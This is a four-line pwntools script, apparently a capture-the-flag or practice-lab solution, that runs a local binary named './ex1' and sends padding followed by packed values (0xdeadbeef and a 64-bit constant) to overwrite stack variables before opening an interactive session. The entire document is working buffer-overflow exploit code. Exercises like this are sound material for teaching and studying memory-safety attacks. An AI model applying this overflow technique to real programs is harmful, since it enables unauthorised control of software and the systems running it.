from pwn import *
sh = process("./ex1")
sh.sendline("a" * 4 + p32(0xdeadbeef) + p64(0x40091eb851eb851f) + "a" * 4)
sh.interactive()